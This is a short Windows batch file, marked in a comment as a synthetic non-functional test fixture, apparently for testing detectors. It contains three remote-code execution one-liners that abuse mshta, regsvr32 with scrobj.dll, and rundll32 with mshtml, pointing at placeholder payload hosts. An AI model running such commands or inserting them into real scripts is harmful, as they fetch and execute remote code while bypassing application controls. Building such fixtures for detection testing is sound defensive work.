@echo off
rem SYNTHETIC TEST FIXTURE — not functional
mshta https://payload.example.invalid/p.hta
regsvr32 /s /n /u /i:https://payload.example.invalid/q.sct scrobj.dll
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";
